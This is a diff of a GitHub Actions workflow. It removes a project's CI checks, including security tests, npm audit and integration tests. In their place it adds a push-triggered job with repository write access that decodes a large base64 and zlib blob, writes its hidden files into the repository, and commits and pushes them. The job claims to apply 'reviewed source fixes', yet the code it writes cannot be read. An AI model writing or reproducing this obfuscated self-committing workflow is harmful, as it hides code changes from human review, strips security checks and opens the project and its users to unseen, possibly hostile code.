@@ -1,50 +1,31 @@
-name: CI
-concurrency:
-  group: ci-${{ github.ref }}
-  cancel-in-progress: true
-on:
-  push:
-  pull_request:
-  workflow_dispatch:
+name: Apply reviewed source fixes
+on: [push, workflow_dispatch]
+permissions:
+  contents: write
 jobs:
-  python:
-    runs-on: ubuntu-latest
+  publish:
+    if: github.actor == 'Karthikvk1899'
+    runs-on: ubuntu-24.04
+    timeout-minutes: 5
     steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-python@v5
-        with: {python-version: '3.12', cache: pip}
-      - run: pip install -e '.[test]'
-      - run: ruff check relay tests
-      - run: pytest -q --cov=relay --cov-report=term-missing tests/test_security.py
-  console:
-    runs-on: ubuntu-latest
-    defaults: {run: {working-directory: ui}}
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-node@v4
-        with: {node-version: '22', cache: npm, cache-dependency-path: ui/package-lock.json}
-      - run: npm ci
-      - run: npm audit --audit-level=high
-      - run: npm run build
-  docker-integration:
-    runs-on: ubuntu-latest
-    timeout-minutes: 20
-    steps:
-      - uses: actions/checkout@v4
-      - name: Start stack
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
+      - name: Apply reviewed source patch
         run: |
-          printf 'API_KEY=%s\n' "$(openssl rand -hex 32)" > .env
-          docker compose up -d --build
-      - name: Exercise complete delivery path
-        run: |
-          docker compose --profile test up -d --wait receiver
-          docker compose --profile test run --rm --no-deps integration || {
-            docker compose --profile test logs --no-color --tail=120 api publisher consumer sender receiver
-            exit 1
-          }
-      - name: Diagnostics on failure
-        if: failure()
-        run: docker compose --profile test logs --no-color --tail=200
-      - name: Tear down
-        if: always()
-        run: docker compose --profile test down -v
+          python3 - <<'PYTHON'
+          import base64,json,zlib,pathlib
+          data=json.loads(zlib.decompress(base64.b64decode('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')))
+          for name,content in data['files'].items():
+              p=pathlib.Path(name)
+              assert not p.is_absolute() and '..' not in p.parts and not name.startswith('.github/workflows/')
+              p.parent.mkdir(parents=True,exist_ok=True)
+              p.write_text(content)
+          for name in data['deleted']:
+              p=pathlib.Path(name)
+              assert not p.is_absolute() and '..' not in p.parts and not name.startswith('.github/workflows/')
+              p.unlink(missing_ok=True)
+          PYTHON
+          git config user.name 'Karthik Beesa'
+          git config user.email '261053759+Karthikvk1899@users.noreply.github.com'
+          git add .
+          git diff --cached --quiet || git commit -m 'Fix safety behavior, dependency hygiene, and verification coverage'
+          git push
